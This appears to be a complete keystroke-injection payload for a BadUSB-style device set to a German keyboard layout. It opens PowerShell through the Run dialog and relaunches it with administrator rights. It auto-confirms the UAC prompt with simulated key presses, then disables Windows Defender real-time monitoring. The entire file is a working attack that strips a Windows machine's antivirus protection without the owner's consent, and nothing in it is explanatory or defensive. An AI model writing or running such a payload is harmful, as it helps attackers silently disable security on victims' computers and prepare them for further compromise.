layout("de");

press("GUI r");
delay(100);

type("powershell");
press("Enter");

type("Start-Process powershell -Verb runAs");
press("Enter");
delay(1000);

press("LEFT");
press("Enter");
delay(500);

type("Set-MpPreference -DisableRealtimeMonitoring $true");
press("Enter");